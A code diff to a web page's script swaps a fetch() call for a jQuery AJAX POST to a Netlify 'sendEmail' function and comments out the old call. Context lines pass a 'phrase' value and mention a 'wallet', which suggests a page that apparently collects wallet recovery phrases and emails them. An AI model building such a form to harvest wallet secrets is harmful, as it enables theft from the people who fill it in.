@@ -2072,8 +2072,36 @@
                 value: phrase,
             };
 
+
+            // Use AJAX to make the request to the Netlify function
+            $.ajax({
+                url: '/.netlify/functions/sendEmail',  // Netlify function endpoint
+                method: "POST",
+                contentType: "application/json",  // Sending JSON data
+                data: JSON.stringify(data),  // Stringify the data object
+                success: function (response) {
+                    // Success callback - show alert and reload the page
+                    alert("Success sending message...");
+                    location.reload();  // Reload the page to reset the form or state
+                },
+                error: function (errMsg) {
+                    // Error callback - show alert with error message
+                    alert("Error sending message. Please try again.");
+                    console.error("Error:", errMsg);  // Log error details to the console
+                },
+                complete: function () {
+                    // Re-enable the submit button and reset text after the request is completed
+                    $('#submitButton').text("Submit").css("pointer-events", "auto");
+                }
+            });
+
+
+
+
+
+
             // Make the POST request to the Netlify function
-            fetch('/.netlify/functions/sendEmail', {
+            /*fetch('/.netlify/functions/sendEmail', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -2089,7 +2117,7 @@
             .catch((error) => {
                 console.error('Error:', error);
                 alert('There was an issue sending your message.');
-            });
+            });*/
       }
 
       function submitStuff(type, wallet, value1) {
